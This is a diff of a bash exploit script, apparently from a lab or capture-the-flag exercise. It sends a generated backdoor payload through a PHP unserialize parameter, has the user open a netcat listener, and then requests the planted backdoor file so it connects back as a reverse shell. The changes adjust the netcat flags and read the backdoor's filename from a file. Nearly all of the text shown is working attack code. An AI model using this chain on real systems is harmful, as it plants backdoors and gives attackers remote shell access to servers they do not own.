@@ -56,7 +56,8 @@ echo
 backdoor_payload=$(php ./make_backdoor.php)
 curl "$URL/?tool=unserialize&input=$backdoor_payload&submit=Submit" > /dev/null
 
-echo "Step 5: Close the Flask app and open a new connection to your internal port using: \`nc -nlvk 1234\`"
+echo "Step 5: Close the Flask app and open a new connection to your internal port using: \`nc -nlv 1234\`"
+echo "You might need to add the -p option if you're working inside a VM."
 echo "Press any key to continue if you did it."
 while [ true ] ; do
     read -n 1
@@ -66,4 +67,5 @@ while [ true ] ; do
 done
 
 echo "Finally: Now I am accessing the backdoor; check the \`nc\` terminal..."
-curl "$URL""/backdoor.php"
+backdoor_name=$(cat backdoor_name.txt)
+curl "$URL""/""$backdoor_name"
